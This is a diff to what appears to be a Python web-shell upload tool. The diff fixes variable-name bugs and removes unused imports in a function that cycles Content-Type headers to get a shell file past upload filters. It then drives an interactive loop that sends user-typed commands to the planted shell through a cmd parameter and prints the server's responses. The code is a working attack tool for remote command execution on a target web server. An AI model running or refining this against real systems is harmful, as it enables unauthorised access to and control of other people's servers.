@@ -6,11 +6,9 @@
 
 import requests
 import optparse
-import os
 import sys
 import json
 import urllib
-import platform
 from urllib.parse import urlparse
 import bs4 as bs
 import requests.cookies
@@ -712,9 +710,9 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
 
                     print(termcolor.colored(f"[*] File uploaded successfully with Content-Type header: {wordlist}",
                                             'yellow'))
-                    domain = urlparse(url).netloc
+                    domain = urlparse(URL).netloc
 
-                    if 'http://' in url:
+                    if 'http://' in URL:
                         print(
                             termcolor.colored(
                                 f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command",
@@ -734,15 +732,15 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                         try:
                             command = input(termcolor.colored("└─$ ", 'green'))
                             cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(url).netloc
+                            domain = urlparse(URL).netloc
 
-                            if 'http://' in url:
+                            if 'http://' in URL:
                                 final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
                             else:
                                 final_url = f"https://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, headers=headers, allow_redirects=False,
-                                                   proxies=proxies, verify=tls)
+                                                   proxies=proxies, verify=TLS)
 
                             print(termcolor.colored(f"URL: {final_url}", 'blue'))
                             print(response.text)
